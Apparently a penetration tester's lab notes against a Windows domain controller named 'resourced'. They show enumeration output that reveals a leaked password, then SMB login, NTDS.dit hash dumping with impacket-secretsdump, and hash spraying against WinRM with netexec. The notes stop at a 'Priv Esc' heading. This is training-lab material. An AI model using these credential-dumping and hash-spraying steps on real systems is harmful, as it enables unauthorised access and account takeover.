
## NMAP

```
# Nmap 7.94SVN scan initiated Wed Jul 24 19:18:10 2024 as: nmap -vv --reason -Pn -T4 -sV -p 139 "--script=banner,(nbstat or smb* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" -oN /home/kali/... -oX /home/kali/... TARGET
Nmap scan report for TARGET
Host is up, received user-set (0.068s latency).
Scanned at 2024-07-24 19:18:10 EDT for 40s

PORT    STATE SERVICE     REASON          VERSION
139/tcp open  netbios-ssn syn-ack ttl 125 Microsoft Windows netbios-ssn
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-mbenum: ERROR: Script execution failed (use -d to debug)
|_smb2-capabilities: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!
|_smb-vuln-ms10-061: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!
|_smb-print-text: false
|_smb2-security-mode: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!
|_smb-protocols: No dialects accepted. Something may be blocking the responses
|_smb2-time: ERROR: Script execution failed (use -d to debug)

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul 24 19:18:50 2024 -- 1 IP address (1 host up) scanned in 40.44 seconds

```
## enum4linux 

```
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Jul 24 19:28:01 2024

 =========================================( Target Information )=========================================

Target ........... TARGET
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==========================( Enumerating Workgroup/Domain on TARGET )==========================


[E] Can't find workgroup/domain



 ==============================( Nbtstat Information for TARGET )==============================

Looking up status of TARGET
No reply from TARGET

 ==================================( Session Check on TARGET )==================================


[+] Server TARGET allows sessions using username '', password ''


 ===============================( Getting domain SID for TARGET )===============================

Domain Name: resourced
Domain Sid: S-1-5-21-537427935-490066102-1511301751

[+] Host is part of a domain (not a workgroup)


 =================================( OS information on TARGET )=================================


[E] Can't get OS info with smbclient


[+] Got OS info for TARGET from srvinfo: 
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED


 ======================================( Users on TARGET )======================================

index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrator	Name: (null)	Desc: Built-in account for administering the computer/domain
index: 0xf72 RID: 0x457 acb: 0x00020010 Account: D.Durant	Name: (null)	Desc: Linear Algebra and crypto god
index: 0xf73 RID: 0x458 acb: 0x00020010 Account: G.Goldberg	Name: (null)	Desc: Blockchain expert
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0xf6d RID: 0x452 acb: 0x00020010 Account: J.Johnson	Name: (null)	Desc: Networking specialist
index: 0xf6b RID: 0x450 acb: 0x00020010 Account: K.Keen	Name: (null)	Desc: Frontend Developer
index: 0xf10 RID: 0x1f6 acb: 0x00020011 Account: krbtgt	Name: (null)	Desc: Key Distribution Center Service Account
index: 0xf6c RID: 0x451 acb: 0x00000210 Account: L.Livingstone	Name: (null)	Desc: SysAdmin
index: 0xf6a RID: 0x44f acb: 0x00020010 Account: M.Mason	Name: (null)	Desc: Ex IT admin
index: 0xf70 RID: 0x455 acb: 0x00020010 Account: P.Parker	Name: (null)	Desc: Backend Developer
index: 0xf71 RID: 0x456 acb: 0x00020010 Account: R.Robinson	Name: (null)	Desc: Database Admin
index: 0xf6f RID: 0x454 acb: 0x00020010 Account: S.Swanson	Name: (null)	Desc: Military Vet now cybersecurity specialist
index: 0xf6e RID: 0x453 acb: 0x00000210 Account: V.Ventz	Name: (null)	Desc: New-hired, reminder: HotelCalifornia194!

Administrator
Guest
krbtgt
M.Mason
K.Keen
L.Livingstone
J.Johnson
V.Vent
S.Swanson
P.Parker
R.Robinson
D.Durant
G.Goldberg

 ================================( Share Enumeration on TARGET )================================

do_connect: Connection to TARGET failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

	Sharename       Type      Comment
	---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on TARGET


 ==========================( Password Policy Information for TARGET )==========================



[+] Attaching to TARGET using a NULL share

[+] Trying protocol 139/SMB...

	[!] Protocol failed: Cannot request session (Called Name:TARGET)

[+] Trying protocol 445/SMB...

[+] Found domain(s):

	[+] resourced
	[+] Builtin

[+] Password Info for Domain: resourced

	[+] Minimum password length: 7
	[+] Password history length: 24
	[+] Maximum password age: 41 days 23 hours 53 minutes 
	[+] Password Complexity Flags: 000001

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 1

	[+] Minimum password age: 1 day 4 minutes 
	[+] Reset Account Lockout Counter: 30 minutes 
	[+] Locked Account Duration: 30 minutes 
	[+] Account Lockout Threshold: None
	[+] Forced Log off Time: Not Set



[+] Retieved partial password policy with rpcclient:


Password Complexity: Enabled
Minimum Password Length: 7


 =====================================( Groups on TARGET )=====================================


[+] Getting builtin groups:

group:[Server Operators] rid:[0x225]
group:[Account Operators] rid:[0x224]
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Incoming Forest Trust Builders] rid:[0x22d]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Administrators] rid:[0x220]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Print Operators] rid:[0x226]
group:[Backup Operators] rid:[0x227]
group:[Replicator] rid:[0x228]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]
group:[RDS Remote Access Servers] rid:[0x23f]
group:[RDS Endpoint Servers] rid:[0x240]
group:[RDS Management Servers] rid:[0x241]
group:[Hyper-V Administrators] rid:[0x242]
group:[Access Control Assistance Operators] rid:[0x243]
group:[Remote Management Users] rid:[0x244]
group:[Storage Replica Administrators] rid:[0x246]

[+]  Getting builtin group memberships:

Group: IIS_IUSRS' (RID: 568) has member: Couldn't lookup SIDs
Group: Guests' (RID: 546) has member: Couldn't lookup SIDs
Group: Windows Authorization Access Group' (RID: 560) has member: Couldn't lookup SIDs
Group: Remote Desktop Users' (RID: 555) has member: Couldn't lookup SIDs
Group: Pre-Windows 2000 Compatible Access' (RID: 554) has member: Couldn't lookup SIDs
Group: Users' (RID: 545) has member: Couldn't lookup SIDs
Group: Administrators' (RID: 544) has member: Couldn't lookup SIDs
Group: Remote Management Users' (RID: 580) has member: Couldn't lookup SIDs

[+]  Getting local groups:

group:[Cert Publishers] rid:[0x205]
group:[RAS and IAS Servers] rid:[0x229]
group:[Allowed RODC Password Replication Group] rid:[0x23b]
group:[Denied RODC Password Replication Group] rid:[0x23c]
group:[DnsAdmins] rid:[0x44d]

[+]  Getting local group memberships:

Group: Denied RODC Password Replication Group' (RID: 572) has member: Couldn't lookup SIDs

[+]  Getting domain groups:

group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]

[+]  Getting domain group memberships:

Group: 'Domain Guests' (RID: 514) has member: resourced\Guest
Group: 'Domain Controllers' (RID: 516) has member: resourced\RESOURCEDC$
Group: 'Enterprise Admins' (RID: 519) has member: resourced\Administrator
Group: 'Group Policy Creator Owners' (RID: 520) has member: resourced\Administrator
Group: 'Domain Admins' (RID: 512) has member: resourced\Administrator
Group: 'Schema Admins' (RID: 518) has member: resourced\Administrator
Group: 'Domain Users' (RID: 513) has member: resourced\Administrator
Group: 'Domain Users' (RID: 513) has member: resourced\krbtgt
Group: 'Domain Users' (RID: 513) has member: resourced\M.Mason
Group: 'Domain Users' (RID: 513) has member: resourced\K.Keen
Group: 'Domain Users' (RID: 513) has member: resourced\L.Livingstone
Group: 'Domain Users' (RID: 513) has member: resourced\J.Johnson
Group: 'Domain Users' (RID: 513) has member: resourced\V.Ventz
Group: 'Domain Users' (RID: 513) has member: resourced\S.Swanson
Group: 'Domain Users' (RID: 513) has member: resourced\P.Parker
Group: 'Domain Users' (RID: 513) has member: resourced\R.Robinson
Group: 'Domain Users' (RID: 513) has member: resourced\D.Durant
Group: 'Domain Users' (RID: 513) has member: resourced\G.Goldberg

 =================( Users on TARGET via RID cycling (RIDS: 500-550,1000-1050) )=================


[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.


 ==============================( Getting printer info for TARGET )==============================

do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Wed Jul 24 19:29:42 2024


```

## nbtscan 

```
Doing NBT name scan for addresses from TARGET



```

## smbclient 

```
do_connect: Connection to TARGET failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available


```

apart of the enum4linux we find creds

`V.Ventz : HotelCalifornia194!`

![Pasted image 20240724193728.png](Evidence/Pasted%20image%2020240724193728.png)

So I logged onto smb with his creds

![Pasted image 20240724193711.png](Evidence/Pasted%20image%2020240724193711.png)

![Pasted image 20240724194020.png](Evidence/Pasted%20image%2020240724194020.png)

![Pasted image 20240724194054.png](Evidence/Pasted%20image%2020240724194054.png)

![Pasted image 20240724194122.png](Evidence/Pasted%20image%2020240724194122.png)

```
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

![Pasted image 20240724194426.png](Evidence/Pasted%20image%2020240724194426.png)


```
netexec winrm TARGET -u users.txt -H hashes.txt
```

with all the hashes newly acquired i'm gonna spray them against winrm to see who can log in 

![Pasted image 20240724194932.png](Evidence/Pasted%20image%2020240724194932.png)

![Pasted image 20240724194942.png](Evidence/Pasted%20image%2020240724194942.png)

![Pasted image 20240724195038.png](Evidence/Pasted%20image%2020240724195038.png)

Priv Esc

